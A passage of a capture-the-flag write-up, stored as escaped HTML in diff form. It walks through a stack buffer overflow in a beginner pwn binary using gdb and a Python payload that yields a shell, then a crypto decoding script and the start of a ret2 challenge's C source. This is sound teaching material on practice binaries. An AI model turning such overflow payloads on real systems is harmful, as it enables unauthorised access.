+  &lt;a href="https://github.com/hugsy/gef"&gt;
+   gef
+  &lt;/a&gt;
+  so I get access to a command
+called
+  &lt;code&gt;
+   context
+  &lt;/code&gt;
+  which prints all sorts of information about registers, the
+stack and a small dissassembly window. I won't show it's output here, but it
+was an indispensable tool that you should install nonetheless.
+ &lt;/p&gt;
+ &lt;p&gt;
+  Let's print the memory at
+  &lt;code&gt;
+   [$rbp - 0x8]
+  &lt;/code&gt;
+  :
+ &lt;/p&gt;
+ &lt;pre&gt;
+  &lt;code&gt;
+   (gdb) x/8gx $rbp - 0x8
+0x7fffffffd758:  0x0000000000000000 0x0000000000000000
+0x7fffffffd768:  0x00007ffff7de4b25 0x00007fffffffd858
+0x7fffffffd778:  0x0000000100000064 0x00000000004011f6
+0x7fffffffd788:  0x0000000000001000 0x00000000004012c0
+  &lt;/code&gt;
+ &lt;/pre&gt;
+ &lt;p&gt;
+  Hmmm, no overwriteage yet. Let's try 56 bytes instead:
+ &lt;/p&gt;
+ &lt;pre&gt;
+  &lt;code&gt;
+   (gdb) run &lt; &lt;(python3 -c "print('a' * 56)")
+(gdb) x/8gx $rbp - 0x8
+0x7fffffffd758:  0x6161616161616161 0x6161616161616161
+0x7fffffffd768:  0x00007ffff7de4b00 0x00007fffffffd858
+0x7fffffffd778:  0x0000000100000064 0x00000000004011f6
+0x7fffffffd788:  0x0000000000001000 0x00000000004012c0
+(gdb) x/1gx $rbp - 0x8
+0x7fffffffd758: 0x6161616161616161
+  &lt;/code&gt;
+ &lt;/pre&gt;
+ &lt;p&gt;
+  Jackpot! We've overwritten 16 bytes of the adress that the
+  &lt;code&gt;
+   cmp
+  &lt;/code&gt;
+  instruction
+reads. Let's try setting it to
+  &lt;code&gt;
+   0xff
+  &lt;/code&gt;
+  instead, so we get a shell. Python 3 is
+not that great for binary exploitation, so the code for this is a little bit
+ugly, but if it works, it works!
+ &lt;/p&gt;
+ &lt;pre&gt;
+  &lt;code&gt;
+   (gdb) run &lt; &lt;(python3 -c "import sys; sys.stdout.buffer.write(b'a' * 40 + b'\xff' * 8)")
+(gdb) x/1gx $rbp - 0x8
+0x7fffffffd758: 0xffffffffffffffff
+  &lt;/code&gt;
+ &lt;/pre&gt;
+ &lt;p&gt;
+  Now let's let execution continue as normal by using the
+  &lt;code&gt;
+   continue
+  &lt;/code&gt;
+  command:
+ &lt;/p&gt;
+ &lt;pre&gt;
+  &lt;code&gt;
+   (gdb) continue
+Continuing.
+[Detaching after vfork from child process 22950]
+[Inferior 1 (process 22947) exited normally]
+  &lt;/code&gt;
+ &lt;/pre&gt;
+ &lt;p&gt;
+  This might seem underwhelming, but our explit works! A child process was
+spawned, and as a bonus, we didn't get any segmentation faults! The reason we
+don't get an interactive shell is because we used python to pipe input into the
+program which makes it non-interactive.
+ &lt;/p&gt;
+ &lt;p&gt;
+  At this point I was about 12 hours in of straight gdb hell, and I was very
+happy to see this shell. After discovering this, I immediately tried it outside
+the debugger and was dissapointed to see that my exploit didn't work. After a
+small panick attack I found out this was because of my environment variables.
+You can launch an environment-less shell by using the
+  &lt;code&gt;
+   env -i sh
+  &lt;/code&gt;
+  command:
+ &lt;/p&gt;
+ &lt;pre&gt;
+  &lt;code&gt;
+   λ generic → λ git master* → env -i sh
+sh-5.1$ python3 -c "import sys; sys.stdout.buffer.write(b'a' * 40 + b'\xff' * 8)" | ./beginner-generic-pwn-number-0
+"𝘭𝘦𝘵𝘴 𝘣𝘳𝘦𝘢𝘬 𝘵𝘩𝘦 𝘵𝘳𝘢𝘥𝘪𝘵𝘪𝘰𝘯 𝘰𝘧 𝘭𝘢𝘴𝘵 𝘮𝘪𝘯𝘶𝘵𝘦 𝘤𝘩𝘢𝘭𝘭 𝘸𝘳𝘪𝘵𝘪𝘯𝘨"
+rob inc has had some serious layoffs lately and i have to do all the beginner pwn all my self!
+can you write me a heartfelt message to cheer me up? :(
+sh-5.1$ # another shell :tada:
+  &lt;/code&gt;
+ &lt;/pre&gt;
+ &lt;p&gt;
+  Now it was time to actually do the exploit on the remote server.
+ &lt;/p&gt;
+ &lt;p&gt;
+  I whipped up the most disgusting and janky python code that I won't go into
+detail about, but here's what is does (in short):
+ &lt;/p&gt;
+ &lt;ol&gt;
+  &lt;li&gt;
+   Create a thread to capture data from the server and forward it to
+   &lt;code&gt;
+    stdout
+   &lt;/code&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+   Capture user commands using
+   &lt;code&gt;
+    input()
+   &lt;/code&gt;
+   and decide what to do with them on the main thread
+  &lt;/li&gt;
+ &lt;/ol&gt;
+ &lt;p&gt;
+  The code for this script can be found
+  &lt;a href="https://github.com/lonkaars/redpwn/blob/master/challenges/generic/pwn.py"&gt;
+   here
+  &lt;/a&gt;
+  ,
+though be warned, it's
+  &lt;em&gt;
+   very
+  &lt;/em&gt;
+  janky and you're probably better off copying
+stuff from stackoverflow. Writing your own tools is more fun though, and might
+also be faster than trying to wrestle with existing tools to try to get them to
+do exactly what you want them to do. In this case I could've also just used
+  &lt;a href="https://reverseengineering.stackexchange.com/questions/13928/managing-inputs-for-payload-injection?noredirect=1&amp;lq=1"&gt;
+   a
+siple
+command
+  &lt;/a&gt;
+  .
+ &lt;/p&gt;
+ &lt;p&gt;
+  It did help me though and I actually had to copy it for use in the other buffer
+overflow challenge that I solved, so I'll probably refactor it someday for use
+in other CTFs.
+ &lt;/p&gt;
+ &lt;h3 id="cryptoround-the-bases"&gt;
+  crypto/round-the-bases
+ &lt;/h3&gt;
+ &lt;p&gt;
+  This crypto challenge uses a text file with some hidden information. If you
+open up the file in a text editor, and adjust your window width, you'll
+eventually see the repeating pattern line up. This makes it very easy to see
+what part of the pattern is actually changing:
+ &lt;/p&gt;
+ &lt;pre&gt;
+  &lt;code&gt;
+   ----------------------xxxx----
+[9km7D9mTfc:..Zt9mTZ_:K0o09mTN
+[9km7D9mTfc:..Zt9mTZ_:K0o09mTN
+[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN
+[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN
+[9km7D9mTfc:..Zt9mTZ_:K0o09mTN
+[9km7D9mTfc:..Zt9mTZ_:K0o09mTN
+[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN
+[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN
+[9km7D9mTfc:..Zt9mTZ_:K0o09mTN
+[9km7D9mTfc:..Zt9mTZ_:K0o09mTN
+[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN
+[9km7D9mTfc:..Zt9mTZ_:K0o09mTN
+[9km7D9mTfc:..Zt9mTZ_:K0o09mTN
+[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN
+[9km7D9mTfc:..Zt9mTZ_:IIcu9mTN
+  &lt;/code&gt;
+ &lt;/pre&gt;
+ &lt;p&gt;
+  I wrote a simple python script to parse this into binary data, and it worked on
+the first try:
+ &lt;/p&gt;
+ &lt;pre&gt;
+  &lt;div class="prismjs"&gt;
+   &lt;code class="language-py" style="white-space:pre"&gt;
+    &lt;span class="token comment"&gt;
+     # read the file into a string
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token builtin"&gt;
+     file
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token operator"&gt;
+     =
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token builtin"&gt;
+     open
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     (
+    &lt;/span&gt;
+    &lt;span class="token string"&gt;
+     "./round-the-bases"
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     )
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+     content
+    &lt;/span&gt;
+    &lt;span class="token operator"&gt;
+     =
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token builtin"&gt;
+     file
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     .
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+     read
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     (
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     )
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token builtin"&gt;
+     file
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     .
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+     close
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     (
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     )
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token comment"&gt;
+     # split on every 30th character into a list
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+     n
+    &lt;/span&gt;
+    &lt;span class="token operator"&gt;
+     =
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token number"&gt;
+     30
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+     arr
+    &lt;/span&gt;
+    &lt;span class="token operator"&gt;
+     =
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     [
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+     content
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     [
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+     i
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     :
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+     i
+    &lt;/span&gt;
+    &lt;span class="token operator"&gt;
+     +
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+     n
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ]
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token keyword"&gt;
+     for
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+     i
+    &lt;/span&gt;
+    &lt;span class="token keyword"&gt;
+     in
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token builtin"&gt;
+     range
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     (
+    &lt;/span&gt;
+    &lt;span class="token number"&gt;
+     0
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ,
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token builtin"&gt;
+     len
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     (
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+     content
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     )
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ,
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+     n
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     )
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ]
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token builtin"&gt;
+     bin
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token operator"&gt;
+     =
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     [
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ]
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token keyword"&gt;
+     for
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+     line
+    &lt;/span&gt;
+    &lt;span class="token keyword"&gt;
+     in
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+     arr
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     :
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+     sub
+    &lt;/span&gt;
+    &lt;span class="token operator"&gt;
+     =
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+     line
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     [
+    &lt;/span&gt;
+    &lt;span class="token number"&gt;
+     16
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     :
+    &lt;/span&gt;
+    &lt;span class="token number"&gt;
+     20
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ]
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token comment"&gt;
+     # the part that changes
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token keyword"&gt;
+     if
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+     sub
+    &lt;/span&gt;
+    &lt;span class="token operator"&gt;
+     ==
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token string"&gt;
+     'IIcu'
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     :
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token comment"&gt;
+     # IIcu -&gt; 0x0
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token builtin"&gt;
+     bin
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     .
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+     append
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     (
+    &lt;/span&gt;
+    &lt;span class="token string"&gt;
+     '0'
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     )
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token keyword"&gt;
+     else
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     :
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token comment"&gt;
+     #             K0o0 -&gt; 0x1
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token builtin"&gt;
+     bin
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     .
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+     append
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     (
+    &lt;/span&gt;
+    &lt;span class="token string"&gt;
+     '1'
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     )
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token builtin"&gt;
+     bin
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token operator"&gt;
+     =
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token string"&gt;
+     ''
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     .
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+     join
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     (
+    &lt;/span&gt;
+    &lt;span class="token builtin"&gt;
+     bin
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     )
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token comment"&gt;
+     # join all the list indices together into a string
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token comment"&gt;
+     # decode the binary string into ascii characters
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token keyword"&gt;
+     for
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+     i
+    &lt;/span&gt;
+    &lt;span class="token keyword"&gt;
+     in
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token builtin"&gt;
+     range
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     (
+    &lt;/span&gt;
+    &lt;span class="token number"&gt;
+     0
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ,
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token builtin"&gt;
+     len
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     (
+    &lt;/span&gt;
+    &lt;span class="token builtin"&gt;
+     bin
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     )
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ,
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token number"&gt;
+     8
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     )
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     :
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token keyword"&gt;
+     print
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     (
+    &lt;/span&gt;
+    &lt;span class="token builtin"&gt;
+     chr
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     (
+    &lt;/span&gt;
+    &lt;span class="token builtin"&gt;
+     int
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     (
+    &lt;/span&gt;
+    &lt;span class="token builtin"&gt;
+     bin
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     [
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+     i
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     :
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+     i
+    &lt;/span&gt;
+    &lt;span class="token operator"&gt;
+     +
+    &lt;/span&gt;
+    &lt;span class="token number"&gt;
+     8
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ]
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ,
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token number"&gt;
+     2
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     )
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     )
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ,
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+     end
+    &lt;/span&gt;
+    &lt;span class="token operator"&gt;
+     =
+    &lt;/span&gt;
+    &lt;span class="token string"&gt;
+     ''
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     )
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token comment"&gt;
+     # newline for good measure
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token keyword"&gt;
+     print
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     (
+    &lt;/span&gt;
+    &lt;span class="token string"&gt;
+     "\n"
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ,
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+     end
+    &lt;/span&gt;
+    &lt;span class="token operator"&gt;
+     =
+    &lt;/span&gt;
+    &lt;span class="token string"&gt;
+     ''
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     )
+    &lt;/span&gt;
+   &lt;/code&gt;
+  &lt;/div&gt;
+ &lt;/pre&gt;
+ &lt;h3 id="pwnret2generic-flag-reader"&gt;
+  pwn/ret2generic-flag-reader
+ &lt;/h3&gt;
+ &lt;p&gt;
+  This was the second binary exploitation challenge I tackled, and it went much
+better than the first because I (sort of) knew what I was doing by now.
+ &lt;/p&gt;
+ &lt;p&gt;
+  I figured the 'ret2' part of the title challenge was short for 'return to', and
+my suspicion was confirmed after looking at the c source:
+ &lt;/p&gt;
+ &lt;pre&gt;
+  &lt;div class="prismjs"&gt;
+   &lt;code class="language-c" style="white-space:pre"&gt;
+    &lt;span class="token macro property directive-hash"&gt;
+     #
+    &lt;/span&gt;
+    &lt;span class="token macro property directive keyword"&gt;
+     include
+    &lt;/span&gt;
+    &lt;span class="token macro property"&gt;
+    &lt;/span&gt;
+    &lt;span class="token macro property string"&gt;
+     &lt;stdio.h&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token macro property directive-hash"&gt;
+     #
+    &lt;/span&gt;
+    &lt;span class="token macro property directive keyword"&gt;
+     include
+    &lt;/span&gt;
+    &lt;span class="token macro property"&gt;
+    &lt;/span&gt;
+    &lt;span class="token macro property string"&gt;
+     &lt;string.h&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token macro property directive-hash"&gt;
+     #
+    &lt;/span&gt;
+    &lt;span class="token macro property directive keyword"&gt;
+     include
+    &lt;/span&gt;
+    &lt;span class="token macro property"&gt;
+    &lt;/span&gt;
+    &lt;span class="token macro property string"&gt;
+     &lt;stdlib.h&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token keyword"&gt;
+     void
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token function"&gt;
+     super_generic_flag_reading_function_please_ret_to_me
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     (
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     )
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     {
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token keyword"&gt;
+     char
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+     flag
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     [
+    &lt;/span&gt;
+    &lt;span class="token number"&gt;
+     0x100
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ]
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token operator"&gt;
+     =
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     {
+    &lt;/span&gt;
+    &lt;span class="token number"&gt;
+     0
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     }
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+     FILE
+    &lt;/span&gt;
+    &lt;span class="token operator"&gt;
+     *
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+     fp
+    &lt;/span&gt;
+    &lt;span class="token operator"&gt;
+     =
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token function"&gt;
+     fopen
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     (
+    &lt;/span&gt;
+    &lt;span class="token string"&gt;
+     "./flag.txt"
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ,
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token string"&gt;
+     "r"
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     )
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token keyword"&gt;
+     if
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     (
+    &lt;/span&gt;
+    &lt;span class="token operator"&gt;
+     !
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+     fp
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     )
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     {
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token function"&gt;
+     puts
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     (
+    &lt;/span&gt;
+    &lt;span class="token string"&gt;
+     "no flag!! contact a member of rob inc"
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     )
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token function"&gt;
+     exit
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     (
+    &lt;/span&gt;
+    &lt;span class="token operator"&gt;
+     -
+    &lt;/span&gt;
+    &lt;span class="token number"&gt;
+     1
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     )
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     }
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token function"&gt;
+     fgets
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     (
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+     flag
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ,
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token number"&gt;
+     0xff
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ,
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+     fp
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     )
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token function"&gt;
+     puts
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     (
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+     flag
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     )
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token function"&gt;
+     fclose
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     (
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+     fp
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     )
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     ;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     }
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token keyword"&gt;
+     int
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token function"&gt;
+     main
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     (
+    &lt;/span&gt;
+    &lt;span class="token keyword"&gt;
+     void
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     )
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token punctuation"&gt;
+     {
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+    &lt;/span&gt;
+    &lt;span class="token keyword"&gt;
+     char
+    &lt;/span&gt;
+    &lt;span class=""&gt;
+     comments_and_concerns
+    &lt;/span&gt;
